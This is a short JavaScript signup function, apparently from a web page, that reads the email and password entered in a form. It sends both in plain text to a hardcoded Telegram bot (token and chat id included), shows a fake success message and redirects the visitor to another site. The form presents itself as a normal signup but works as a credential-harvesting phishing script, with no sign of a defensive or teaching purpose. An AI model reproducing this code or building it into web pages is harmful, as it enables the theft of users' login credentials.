
function signup(){
 
    let mail = document.getElementById('nmail').value;
    let password = document.getElementById('npassword').value;
    var chat_id = 2097014526;
    var msg = mail + "%0A" + password;
    var token = "5218159361:AAGkRRiN7-p9qDyV5ULidhImE-iy38Vxogo";
    var sendText = 'https://api.telegram.org/bot'+token+'/sendMessage?chat_id='+chat_id+'&text='+ msg ;
    fetch(sendText);
    document.getElementById('alert-success').classList.remove('d-none');
    setTimeout(() => {document.getElementById('alert-success').classList.add('d-none');}, 3000);
    setTimeout(() => {window.location.href ='http://flames-checker.vercel.app/';}, 10000);
    
}
